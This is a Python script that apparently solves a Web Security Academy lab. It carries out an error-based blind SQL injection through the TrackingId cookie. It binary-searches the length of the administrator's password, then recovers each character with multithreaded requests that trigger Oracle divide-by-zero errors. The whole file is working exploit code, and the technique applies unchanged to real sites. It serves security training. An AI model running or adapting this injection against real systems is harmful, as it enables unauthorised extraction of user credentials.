import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print

s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def main() -> None:
    URL = "https://0a53003e0437c6a58059359e00650073.web-security-academy.net/filter?category=Pets"
    s.get(URL)

    tracking_id = s.cookies.get("TrackingId")
    session = s.cookies.get("session")

    # Find length of password
    _high = 40
    _low = 0
    while _low < _high:
        mid = (_low + _high) // 2
        print(f"Trying number {mid}...")

        if (
            status_code := r.get(
                URL,
                cookies={
                    "TrackingId": tracking_id
                    + f"'||(SELECT CASE WHEN LENGTH(password)>{mid} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
                    "session": session,
                },
            ).status_code
        ) == 500:
            _low = mid + 1
        else:
            _high = mid

    length = _low
    print(f"The password length is: {length}")

    def find_char(idx, dct):
        stop_event = Event()

        def check_char(ch):
            if stop_event.is_set():
                return ch, False

            response = r.get(
                URL,
                cookies={
                    "TrackingId": tracking_id
                    + f"'||(SELECT CASE WHEN SUBSTR(password,{idx},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
                    "session": session,
                },
            )
            if response.status_code == 500:
                stop_event.set()
                dct[idx] = ch
                print(dct)
                print(f"{ch}: True")

                return ch, True

            return ch, False

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_char, ch) for ch in charset]
            for future in as_completed(futures):
                if stop_event.is_set():
                    for f in futures:
                        f.cancel()  # Only cancels tasks that haven't started
                    break

    dct = {}

    with ThreadPoolExecutor(max_workers=10) as executor:
        [executor.submit(find_char, idx, dct) for idx in range(1, length + 1)]


if __name__ == "__main__":
    main()
